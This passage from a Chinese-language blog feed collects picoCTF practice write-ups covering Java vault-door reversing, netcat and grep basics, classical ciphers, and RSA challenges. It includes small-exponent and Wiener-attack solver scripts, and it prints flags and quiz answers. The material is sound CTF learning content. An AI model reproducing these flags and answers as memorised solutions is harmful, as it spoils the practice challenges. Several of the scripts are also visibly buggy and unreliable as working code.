false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>依次对数组中的数据进行处理，分别为ASCII,十六进制，八进制与原字母，串联得flag.</p><h3><span id="vault-door-5"><em>vault-door-5</em></span></h3><blockquote><p>[vault-door-5](In the last challenge, you mastered octal (base 8), decimal (base 10), and hexadecimal (base 16) numbers, but this vault door uses a different change of base as well as URL encoding! The source code for this vault is here: VaultDoor5.java)</p><blockquote><p>You may find an encoder/decoder tool helpful, such as <a href="https://encoding.tools/;Read">https://encoding.tools/;Read</a> the wikipedia articles on URL encoding and base 64 encoding to understand how they work and what the results look like.</p></blockquote></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public String urlEncode(byte[] input) &#123;</span><br><span class="line">        StringBuffer buf &#x3D; new StringBuffer();</span><br><span class="line">        for (int i&#x3D;0; i&lt;input.length; i++) &#123;</span><br><span class="line">            buf.append(String.format(&quot;%%%2x&quot;, input[i]));</span><br><span class="line">        &#125;</span><br><span class="line">        return buf.toString();</span><br><span class="line">    &#125;</span><br><span class="line">public boolean checkPassword(String password) &#123;</span><br><span class="line">        String urlEncoded &#x3D; urlEncode(password.getBytes());</span><br><span class="line">        String base64Encoded &#x3D; base64Encode(urlEncoded.getBytes());</span><br><span class="line">        String expected &#x3D; &quot;JTYzJTMwJTZlJTc2JTMzJTcyJTc0JTMxJTZlJTY3JTVm&quot;</span><br><span class="line">                        + &quot;JTY2JTcyJTMwJTZkJTVmJTYyJTYxJTM1JTY1JTVmJTM2&quot;</span><br><span class="line">                        + &quot;JTM0JTVmJTM4JTM0JTY2JTY0JTM1JTMwJTM5JTM1&quot;;</span><br><span class="line">        return base64Encoded.equals(expected);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>将expected中得字符串联后，base64解密后，URL解密得flag。</p><h3><span id="vault-door-6"><em>vault-door-6</em></span></h3><blockquote><p>[vault-door-6](This vault uses an XOR encryption scheme. The source code for this vault is here: VaultDoor6.java)</p><blockquote><p>If X ^ Y = Z, then Z ^ Y = X. Write a program that decrypts the flag based on this fact.</p></blockquote></blockquote><p>根据HINT，可知该题与异或有关，转二进制后编写脚本（以下为笔者的辣鸡脚本）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">modetext&#x3D;&#39;01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010&#39;</span><br><span class="line">plaintext&#x3D;&#39;0011101101100101001000011010000000111000000000000011011000011101101000000011110101100001001001110001000101100110001001111010000000100001000111010110000100111011101000000010110101100101001001111010000001100110001101100011000001100111011011000110010001101100&#39;</span><br><span class="line">plain&#x3D;plaintext.replace(&#39; &#39;, &#39;&#39;)</span><br><span class="line">mode&#x3D;modetext.replace(&#39; &#39;,&#39;&#39;)</span><br><span class="line">print(mode)</span><br><span class="line">new&#x3D;&#39;&#39;</span><br><span class="line">for i in range(0,len(plain)):</span><br><span class="line">    if(plain[i]&#x3D;&#x3D;&#39;0&#39;):</span><br><span class="line">        new +&#x3D; mode[i]</span><br><span class="line">    elif(plain[i]&#x3D;&#x3D;&#39;1&#39;):</span><br><span class="line">        new +&#x3D; str(1-int(mode[i]))</span><br><span class="line">print(new)</span><br><span class="line">print(plain)</span><br></pre></td></tr></table></figure><p>二进制转字符后得flag.</p><h3><span id="vault-door-7"><em>vault-door-7</em></span></h3><blockquote><p>[vault-door-7](This vault uses bit shifts to convert a password string into an array of integers. Hurry, agent, we are running out of time to stop Dr. Evil’s nefarious plans! The source code for this vault is here: VaultDoor7.java)</p><blockquote><p>Use a decimal/hexadecimal converter such as this one: <a href="https://www.mathsisfun.com/binary-decimal-hexadecimal-converter.html;You">https://www.mathsisfun.com/binary-decimal-hexadecimal-converter.html;You</a> will also need to consult an ASCII table such as this one: <a href="https://www.asciitable.com/">https://www.asciitable.com/</a></p></blockquote></blockquote><p>笔者的脚本</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x&#x3D;0</span><br><span class="line">x[0] &#x3D;1096770097</span><br><span class="line">x[1] &#x3D;1952395366</span><br><span class="line">x[2] &#x3D;1600270708</span><br><span class="line">x[3] &#x3D;1601398833</span><br><span class="line">x[4] &#x3D;1716808014</span><br><span class="line">x[5] &#x3D;1734293296</span><br><span class="line">x[6] &#x3D;842413104</span><br><span class="line">x[7] &#x3D;1684157793</span><br><span class="line">before&#x3D;&#39;&#39;</span><br><span class="line">for i in range(0,8):</span><br><span class="line">    before[i]&#x3D;x[i*4]&gt;&gt;24|x[i*4+1]&gt;&gt;16|x[i*4+2]&gt;&gt;8|x[i*4+3]</span><br><span class="line">    print(before)</span><br></pre></td></tr></table></figure><blockquote><blockquote><p>做了一连串RE题之后对编写脚本和逆向增加了一定的了解。挺好。</p></blockquote></blockquote><h2><span id="general-skills">General Skills</span></h2><hr><h3><span id="2warm"><em>2Warm</em></span></h3><blockquote><p>[2Warm]</p><blockquote><p>Can you convert the number 42 (base 10) to binary (base 2)?</p></blockquote></blockquote><p>十进制42转二进制，在线网站即可。</p><h3><span id="warmed-up"><em>Warmed Up</em></span></h3><blockquote><p>[Warmed Up]</p><blockquote><p>What is 0x3D (base 16) in decimal (base 10)?</p></blockquote></blockquote><p>十六进制转十进制，同上</p><h3><span id="lets-warm-up"><em>Lets Warm Up</em></span></h3><blockquote><p>[Lets Warm Up]</p><blockquote><p>If I told you a word started with 0x70 in hexadecimal, what would it start with in ASCII?</p></blockquote></blockquote><p>十六进制转ASCII，同上</p><h3><span id="strings-it">*strings it *</span></h3><blockquote><p>[strings it ]</p><blockquote><p>Can you find the flag in file without running it?</p></blockquote></blockquote><p>执行命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strings XXX | grep picoCTF</span><br></pre></td></tr></table></figure><p>得关键词。</p><h3><span id="bases"><em>Bases</em></span></h3><blockquote><p>[Bases]</p><blockquote><p>What does this bDNhcm5fdGgzX3IwcDM1 mean? I think it has something to do with bases.</p></blockquote></blockquote><p>Base一把梭寻找可能字符串。</p><h3><span id="first-grep"><em>First Grep</em></span></h3><blockquote><p>[First Grep]</p><blockquote><p>Can you find the flag in file? This would be really tedious to look through manually, something tells me there is a better way.</p></blockquote></blockquote><p>直接打开可得flag.</p><h3><span id="whats-a-net-cat"><em>what’s a net cat?</em></span></h3><blockquote><p>[what’s a net cat?]</p><blockquote><p>Using netcat (nc) is going to be pretty important. Can you connect to <a href="http://jupiter.challenges.picoctf.org">jupiter.challenges.picoctf.org</a> at port 29138 to get the flag?</p></blockquote></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc jupiter.challenges.picoctf.org 29138</span><br></pre></td></tr></table></figure><h3><span id="plumbing"><em>plumbing</em></span></h3><blockquote><p>[plumbing]</p><blockquote><p>Sometimes you need to handle process data outside of a file. Can you find a way to keep the output from this program and search for the flag? Connect to <a href="http://jupiter.challenges.picoctf.org">jupiter.challenges.picoctf.org</a> 22058.</p></blockquote></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc jupiter.challenges.picoctf.org 22058 |grep picoCTF</span><br></pre></td></tr></table></figure><p>同前题</p><h3><span id="based"><em>Based</em></span></h3><blockquote><p>[Based]</p><blockquote><p>To get truly 1337, you must understand different data encodings, such as hexadecimal or binary. Can you get the flag from this program to prove you are on the way to becoming 1337? Connect with nc <a href="http://jupiter.challenges.picoctf.org">jupiter.challenges.picoctf.org</a> 9670.</p></blockquote></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># nc jupiter.challenges.picoctf.org 9670</span><br><span class="line">Let us see how data is stored</span><br><span class="line">pie</span><br><span class="line">Please give the 01110000 01101001 01100101 as a word.</span><br><span class="line">...</span><br><span class="line">you have 45 seconds.....</span><br><span class="line"></span><br><span class="line">Input:</span><br><span class="line">pie</span><br><span class="line">Please give me the  163 157 143 153 145 164 as a word.</span><br><span class="line">Input:</span><br><span class="line">socket</span><br><span class="line">Please give me the 636f6c6f7261646f as a word.</span><br><span class="line">Input:</span><br><span class="line">colorado</span><br><span class="line">You&#39;ve beaten the challenge</span><br><span class="line">Flag: picoCTF&#123;learning_about_converting_values_b375bb16&#125;</span><br></pre></td></tr></table></figure><p>二进制八进制十六进制转换。</p><h3><span id="mus1c"><em>mus1c</em></span></h3><blockquote><p>[mus1c](I wrote you a song. Put it in the picoCTF{} flag format.)</p><blockquote><p>Do you think you can master rockstar?</p></blockquote></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Pico&#39;s a CTFFFFFFF</span><br><span class="line">my mind is waitin</span><br><span class="line">It&#39;s waitin</span><br><span class="line"></span><br><span class="line">Put my mind of Pico into This</span><br><span class="line">my flag is not found</span><br><span class="line">put This into my flag</span><br><span class="line">put my flag into Pico</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shout Pico</span><br><span class="line">shout Pico</span><br><span class="line">shout Pico</span><br><span class="line"></span><br><span class="line">My song&#39;s something</span><br><span class="line">put Pico into This</span><br><span class="line"></span><br><span class="line">Knock This down, down, down</span><br><span class="line">put This into CTF</span><br><span class="line"></span><br><span class="line">shout CTF</span><br><span class="line">my lyric is nothing</span><br><span class="line">Put This without my song into my lyric</span><br><span class="line">Knock my lyric down, down, down</span><br><span class="line"></span><br><span class="line">shout my lyric</span><br><span class="line"></span><br><span class="line">Put my lyric into This</span><br><span class="line">Put my song with This into my lyric</span><br><span class="line">Knock my lyric down</span><br><span class="line"></span><br><span class="line">shout my lyric</span><br><span class="line"></span><br><span class="line">Build my lyric up, up ,up</span><br><span class="line"></span><br><span class="line">shout my lyric</span><br><span class="line">shout Pico</span><br><span class="line">shout It</span><br><span class="line"></span><br><span class="line">Pico CTF is fun</span><br><span class="line">security is important</span><br><span class="line">Fun is fun</span><br><span class="line">Put security with fun into Pico CTF</span><br><span class="line">Build Fun up</span><br><span class="line">shout fun times Pico CTF</span><br><span class="line">put fun times Pico CTF into my song</span><br><span class="line"></span><br><span class="line">build it up</span><br><span class="line"></span><br><span class="line">shout it</span><br><span class="line">shout it</span><br><span class="line"></span><br><span class="line">build it up, up</span><br><span class="line">shout it</span><br><span class="line">shout Pico</span><br></pre></td></tr></table></figure><p>根据hint搜索rockstar,得一<a href="https://codewithrockstar.com/online">在线网站</a>，解密得</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">114</span><br><span class="line">114</span><br><span class="line">114</span><br><span class="line">111</span><br><span class="line">99</span><br><span class="line">107</span><br><span class="line">110</span><br><span class="line">114</span><br><span class="line">110</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">49</span><br><span class="line">51</span><br><span class="line">114</span><br><span class="line">Program completed in 361 ms</span><br></pre></td></tr></table></figure><p>转ASCII得flag.</p><h3><span id="1_wanna_b3_a_r0ck5tar"><em>1_wanna_b3_a_r0ck5tar</em></span></h3><blockquote><p>[1_wanna_b3_a_r0ck5tar]</p><blockquote><p>I wrote you another song. Put the flag in the picoCTF{} flag format</p></blockquote></blockquote><p>上题的方法失败读脚本通过</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rocknroll is right              </span><br><span class="line">Silence is wrong                </span><br><span class="line">A guitar is a six-string </span><br></pre></td></tr></table></figure><p>等，猜测为类似伪代码，更改运行可得flag.</p><h2><span id="cryptography">Cryptography</span></h2><hr><h3><span id="the-numbers"><em>The Numbers</em></span></h3><blockquote><p><a href="https://play.picoctf.org/practice/challenge/68?category=2&amp;page=1">The Numbers</a></p><blockquote><p>The flag is in the format PICOCTF{}</p></blockquote></blockquote><p>得到一串数字</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">16 9 3 15 3 20 6 &#123; 20 8 5 14 21 13 2 5 18 19 13 1 19 15 14 &#125;</span><br></pre></td></tr></table></figure><p>根据hint，对照ASCII，已知部门为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">80 73 67 79 67 84 70 &#123; &#125;</span><br></pre></td></tr></table></figure><p>编写脚本，思路为after=before+64，或者手动加工也可得到flag.</p><h3><span id="caesar"><em>caesar</em></span></h3><blockquote><p><a href="https://play.picoctf.org/practice/challenge/64?category=2&amp;page=1">caesar</a></p><blockquote><p>caesar cipher tutorial</p></blockquote></blockquote><p>在线网站或者脚本都可解密，遍历后选取相对有意思的字符即是flag.</p><h3><span id="easy1"><em>Easy1</em></span></h3><blockquote><p><a href="https://play.picoctf.org/practice/challenge/43?category=2&amp;page=1">Easy1</a></p><blockquote><p>The one time pad can be cryptographically secure, but not when you know the key. Can you solve this? We’ve given you the encrypted flag, key, and a table to help UFJKXQZQUNB with the key of SOLVECRYPTO. Can you use this table to solve it?.</p></blockquote></blockquote><blockquote><blockquote><p>Submit your answer in our flag format. For example, if your answer was ‘hello’, you would submit ‘picoCTF{HELLO}’ as the flag.Please use all caps for the message.</p></blockquote></blockquote><p>据题意，已知该加密方式拥有明文和密钥，结合给出的字典，确定为维吉尼亚编码，在线网站或脚本都可解密得flag。</p><h3><span id="13"><em>13</em></span></h3><blockquote><p>[13](Cryptography can be easy, do you know what ROT13 is? cvpbPGS{abg_gbb_onq_bs_n_ceboyrz})</p><blockquote><p>This can be solved online if you don’t want to do it by hand!</p></blockquote></blockquote><p>题目描述可知加密方式为ROT13,在线网站或脚本即可解密。</p><h3><span id="la-cifra-de"><em>la cifra de</em></span></h3><blockquote><p>[la cifra de](I found this cipher in an old book. Can you figure out what it says? Connect with nc <a href="http://jupiter.challenges.picoctf.org">jupiter.challenges.picoctf.org</a> 50523)</p><blockquote><p>There are tools that make this easy.Perhaps looking at history will help</p></blockquote></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Encrypted message:</span><br><span class="line">Ne iy nytkwpsznyg nth it mtsztcy vjzprj zfzjy rkhpibj nrkitt ltc tnnygy ysee itd tte cxjltk</span><br><span class="line"></span><br><span class="line">Ifrosr tnj noawde uk siyyzre, yse Bnretèwp Cousex mls hjpn xjtnbjytki xatd eisjd</span><br><span class="line"></span><br><span class="line">Iz bls lfwskqj azycihzeej yz Brftsk ip Volpnèxj ls oy hay tcimnyarqj dkxnrogpd os 1553 my Mnzvgs Mazytszf Merqlsu ny hox moup Wa inqrg ipl. Ynr. Gotgat Gltzndtg Gplrfdo </span><br><span class="line"></span><br><span class="line">Ltc tnj tmvqpmkseaznzn uk ehox nivmpr g ylbrj ts ltcmki my yqtdosr tnj wocjc hgqq ol fy oxitngwj arusahje fuw ln guaaxjytrd catizm tzxbkw zf vqlckx hizm ceyupcz yz tnj fpvjc hgqqpohzCZK&#123;m311a50_0x_a1rn3x3_h1ah3x6kp60egf&#125;</span><br><span class="line"></span><br><span class="line">Ehk ktryy herq-ooizxetypd jjdcxnatoty ol f aordllvmlbkytc inahkw socjgex, bls sfoe gwzuti 1467 my Rjzn Hfetoxea Gqmexyt.</span><br><span class="line"></span><br><span class="line">Tnj Gimjyèrk Htpnjc iy ysexjqoxj dosjeisjd cgqwej yse Gqmexyt Doxn ox Fwbkwei Inahkw.</span><br><span class="line"></span><br><span class="line">Tn 1508, Ptsatsps Zwttnjxiax tnbjytki ehk xz-cgqwej ylbaql rkhea (g rltxni ol xsilypd gqahggpty) ysaz bzuri wazjc bk f nroytcgq nosuznkse ol yse Bnretèwp Cousex.</span><br><span class="line"></span><br><span class="line">Gplrfdo’y xpcuso butvlky lpvjlrki tn 1555 gx l cuseitzltoty ol yse lncsz. Yse rthex mllbjd ol yse gqahggpty fce tth snnqtki cemzwaxqj, bay ehk fwpnfmezx lnj yse osoed qptzjcs gwp mocpd hd xegsd ol f xnkrznoh vee usrgxp, wnnnh ify bk itfljcety hizm paim noxwpsvtydkse.</span><br></pre></td></tr></table></figure><p><a href="https://www.guballa.de/vigenere-solver">在线网站</a>维吉尼亚解密可得flag.</p><blockquote><p>词频分析搞了半天，555</p></blockquote><h3><span id="rsa-pop-quiz"><em>rsa-pop-quiz</em></span></h3><blockquote><p>[rsa-pop-quiz](Class, take your seats! It’s PRIME-time for a quiz… nc <a href="http://jupiter.challenges.picoctf.org">jupiter.challenges.picoctf.org</a> 41130)</p><blockquote><p>RSA info</p></blockquote></blockquote><p>RSA层层解密：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># nc jupiter.challenges.picoctf.org 41130</span><br><span class="line">Good morning class! It&#39;s me Ms. Adleman-Shamir-Rivest</span><br><span class="line">Today we will be taking a pop quiz, so I hope you studied. Cramming just will not do!</span><br><span class="line">You will need to tell me if each example is possible, given your extensive crypto knowledge.</span><br><span class="line">Inputs and outputs are in decimal. No hex here!</span><br><span class="line">#### NEW PROBLEM ####</span><br><span class="line">q : 60413</span><br><span class="line">p : 76753</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">n</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y&#x2F;N):y</span><br><span class="line">#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">n: 4636878989</span><br><span class="line">Outstanding move!!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### NEW PROBLEM ####</span><br><span class="line">p : 54269</span><br><span class="line">n : 5051846941</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">q</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y&#x2F;N):y</span><br><span class="line">#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">q: 93089</span><br><span class="line">Outstanding move!!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### NEW PROBLEM ####</span><br><span class="line">e : 3</span><br><span class="line">n : 12738162802910546503821920886905393316386362759567480839428456525224226445173031635306683726182522494910808518920409019414034814409330094245825749680913204566832337704700165993198897029795786969124232138869784626202501366135975223827287812326250577148625360887698930625504334325804587329905617936581116392784684334664204309771430814449606147221349888320403451637882447709796221706470239625292297988766493746209684880843111138170600039888112404411310974758532603998608057008811836384597579147244737606088756299939654265086899096359070667266167754944587948695842171915048619846282873769413489072243477764350071787327913</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">q</span><br><span class="line">p</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y&#x2F;N):n</span><br><span class="line">Outstanding move!!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### NEW PROBLEM ####</span><br><span class="line">q : 66347</span><br><span class="line">p : 12611</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">totient(n)</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y&#x2F;N):y</span><br><span class="line">#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">totient(n): 836623060</span><br><span class="line">Outstanding move!!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### NEW PROBLEM ####</span><br><span class="line">plaintext : 6357294171489311547190987615544575133581967886499484091352661406414044440475205342882841236357665973431462491355089413710392273380203038793241564304774271529108729717</span><br><span class="line">e : 3</span><br><span class="line">n : 29129463609326322559521123136222078780585451208149138547799121083622333250646678767769126248182207478527881025116332742616201890576280859777513414460842754045651093593251726785499360828237897586278068419875517543013545369871704159718105354690802726645710699029936754265654381929650494383622583174075805797766685192325859982797796060391271817578087472948205626257717479858369754502615173773514087437504532994142632207906501079835037052797306690891600559321673928943158514646572885986881016569647357891598545880304236145548059520898133142087545369179876065657214225826997676844000054327141666320553082128424707948750331</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">ciphertext</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y&#x2F;N):y</span><br><span class="line">#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">ciphertext: 256931246631782714357241556582441991993437399854161372646318659020994329843524306570818293602492485385337029697819837182169818816821461486018802894936801257629375428544752970630870631166355711254848465862207765051226282541748174535990314552471546936536330397892907207943448897073772015986097770443616540466471245438117157152783246654401668267323136450122287983612851171545784168132230208726238881861407976917850248110805724300421712827401063963117423718797887144760360749619552577176382615108244813</span><br><span class="line">Outstanding move!!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### NEW PROBLEM ####</span><br><span class="line">ciphertext : 107524013451079348539944510756143604203925717262185033799328445011792760545528944993719783392542163428637172323512252624567111110666168664743115203791510985709942366609626436995887781674651272233566303814979677507101168587739375699009734588985482369702634499544891509228440194615376339573685285125730286623323</span><br><span class="line">e : 3</span><br><span class="line">n : 27566996291508213932419371385141522859343226560050921196294761870500846140132385080994630946107675330189606021165260590147068785820203600882092467797813519434652632126061353583124063944373336654246386074125394368479677295167494332556053947231141336142392086767742035970752738056297057898704112912616565299451359791548536846025854378347423520104947907334451056339439706623069503088916316369813499705073573777577169392401411708920615574908593784282546154486446779246790294398198854547069593987224578333683144886242572837465834139561122101527973799583927411936200068176539747586449939559180772690007261562703222558103359</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">plaintext</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y&#x2F;N):n</span><br><span class="line">Outstanding move!!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### NEW PROBLEM ####</span><br><span class="line">q : 92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559</span><br><span class="line">p : 97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637</span><br><span class="line">e : 65537</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">d</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y&#x2F;N):y</span><br><span class="line">#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">d: 1405046269503207469140791548403639533127416416214210694972085079171787580463776820425965898174272870486015739516125786182821637006600742140682552321645503743280670839819078749092730110549881891271317396450158021688253989767145578723458252769465545504142139663476747479225923933192421405464414574786272963741656223941750084051228611576708609346787101088759062724389874160693008783334605903142528824559223515203978707969795087506678894006628296743079886244349469131831225757926844843554897638786146036869572653204735650843186722732736888918789379054050122205253165705085538743651258400390580971043144644984654914856729</span><br><span class="line">Outstanding move!!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### NEW PROBLEM ####</span><br><span class="line">p : 153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433</span><br><span class="line">ciphertext : 18031488536864379496089550017272599246134435121343229164236671388038630752847645738968455413067773166115234039247540029174331743781203512108626594601293283737392240326020888417252388602914051828980913478927759934805755030493894728974208520271926698905550119698686762813722190657005740866343113838228101687566611695952746931293926696289378849403873881699852860519784750763227733530168282209363348322874740823803639617797763626570478847423136936562441423318948695084910283653593619962163665200322516949205854709192890808315604698217238383629613355109164122397545332736734824591444665706810731112586202816816647839648399</span><br><span class="line">e : 65537</span><br><span class="line">n : 23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">plaintext</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y&#x2F;N):y</span><br><span class="line">#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">plaintext: picoCTF&#123;wA8_th4t$_ill3aGal..ode01e4bb&#125;</span><br><span class="line">That&#39;s not an int! Exiting</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="tapping"><em>Tapping</em></span></h3><blockquote><p>[Tapping](Theres tapping coming in from the wires. What’s it saying nc <a href="http://jupiter.challenges.picoctf.org">jupiter.challenges.picoctf.org</a> 28927.)</p><blockquote><p>What kind of encoding uses dashes and dots?The flag is in the format PICOCTF{}</p></blockquote></blockquote><p>摩斯电码解密。</p><h3><span id="mr-worldwide"><em>Mr-Worldwide</em></span></h3><blockquote><p>[Mr-Worldwide](A musician left us a message. What’s it mean?)</p></blockquote><p>坐标，百度可查找经纬度，提取城市首字母得flag.</p><h3><span id="flags"><em>Flags</em></span></h3><blockquote><p>[Flags](What do the flags mean?)</p><blockquote><p>The flag is in the format PICOCTF{}</p></blockquote></blockquote><p>简单的替换密码，百度找到对应网站和图片即可。<a href="https://en.wikipedia.org/wiki/International_maritime_signal_flags">https://en.wikipedia.org/wiki/International_maritime_signal_flags</a></p><h3><span id="waves-over-lambda"><em>waves over lambda</em></span></h3><blockquote><p>[waves over lambda](We made a lot of substitutions to encrypt this. Can you decrypt it? Connect with nc <a href="http://jupiter.challenges.picoctf.org">jupiter.challenges.picoctf.org</a> 1981.)</p><blockquote><p>Flag is not in the usual flag format</p></blockquote></blockquote><p>同为词频分析，观察后猜测jgsk=flag，丢进<a href="https://quipqiup.com/">在线网站</a>求解得flag.</p><h3><span id="minirsa"><em>miniRSA</em></span></h3><blockquote><p><a href="https://play.picoctf.org/practice/challenge/73?category=2&amp;page=1">miniRSA</a></p><blockquote><p>RSA tutorial;How could having too small an e affect the security of this 2048 bit key?Make sure you don’t lose precision, the numbers are pretty big (besides the e value)</p></blockquote></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">N&#x3D;29331922499794985782735976045591164936683059380558950386560160105740343201513369939006307531165922708949619162698623675349030430859547825708994708321803705309459438099340427770580064400911431856656901982789948285309956111848686906152664473350940486507451771223435835260168971210087470894448460745593956840586530527915802541450092946574694809584880896601317519794442862977471129319781313161842056501715040555964011899589002863730868679527184420789010551475067862907739054966183120621407246398518098981106431219207697870293412176440482900183550467375190239898455201170831410460483829448603477361305838743852756938687673</span><br><span class="line">e&#x3D;3</span><br><span class="line">c&#x3D;2205316413931134031074603746928247799030155221252519872650080519263755075355825243327515211479747536697517688468095325517209911688684309894900992899707504087647575997847717180766377832435022794675332132906451858990782325436498952049751141 </span><br><span class="line">m &#x3D; int(gmpy2.iroot(c, e)[0])</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line">print(m)</span><br><span class="line">#b&#39;picoCTF&#123;n33d_a_lArg3r_e_d0cd6eae&#125;&#39;</span><br><span class="line">#13016382529449106065894479374027604750406953699090365388203722801043052339225981</span><br></pre></td></tr></table></figure><h3><span id="b00tl3grsa2"><em>b00tl3gRSA2</em></span></h3><blockquote><p>[b00tl3gRSA2](In RSA d is a lot bigger than e, why don’t we use d to encrypt instead of e? Connect with nc <a href="http://jupiter.challenges.picoctf.org">jupiter.challenges.picoctf.org</a> 42900.)</p><blockquote><p>What is e generally?</p></blockquote></blockquote><p>nc后发现e很大，维纳攻击脚本：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import  RSAwienerHacker</span><br><span class="line">c&#x3D;67725484828660171155495211630497256983804750771405173604915475315285337259554745019946599487641055680169265457644340938264529723371169972500050850583888499676593738216542714158045211992126456724042909731789545505279795504523037528761238149430515678580782074452909931229053012113137701929175885390372056497999</span><br><span class="line">n&#x3D;92908556262738254094065441172814586106067369443369499189214986491976931561738844273516700957530563178532708425726354645373760924007923816005398578319882528611540185427918571906094044173194388663365364134997826444445816336765012006409280712402476371185929572990909183399977560298360727962550970347800300222711</span><br><span class="line">e&#x3D;69520159460585947518483836148643582831918423640590763549444035011978832519891224565191960240113848478143117452571748866357688968863765140502139873387990270685914837356707507222866135679527601234329281217279226396840073020368275802208410100769859080342284164663788369069928003055037897805163984210272130270657</span><br><span class="line">d &#x3D;  RSAwienerHacker.hack_RSA(e,n)</span><br><span class="line">if d:</span><br><span class="line">    print(d)</span><br><span class="line">#import hashlib</span><br><span class="line">import binascii</span><br><span class="line">#flag &#x3D;hashlib.md5(hex(d)).hexdigest()</span><br><span class="line">#print flag</span><br><span class="line">m&#x3D;pow(c,d,n)</span><br><span class="line">print(hex(m))</span><br></pre></td></tr></table></figure><p>十六进制转字符串后得明文。</p><h3><span id="john_pollard"><em>john_pollard</em></span></h3><blockquote><p>[john_pollard](Sometimes RSA certificates are breakable)</p><blockquote><p>The flag is in the format picoCTF{p,q};Try swapping p and q if it does not work</p></blockquote></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2&gt;&lt;span id=&quot;forensics&quot;&gt;Forensics&lt;/span&gt;&lt;/h2&gt;
&lt;hr&gt;
&lt;h3&gt;&lt;span id=&quot;glory-of-the-garden&quot;&gt;&lt;em&gt;Glory of the Garden&lt;/em&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;blockquote&gt;</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
  </entry>
  
  <entry>
    <title>MISC-data-2</title>
    <link href="http://mklkx.github.io/2021/03/22/MISC-data-2/"/>
    <id>http://mklkx.github.io/2021/03/22/MISC-data-2/</id>
    <published>2021-03-22T12:32:24.000Z</published>
    <updated>2021-05-13T12:37:45.727Z</updated>
    
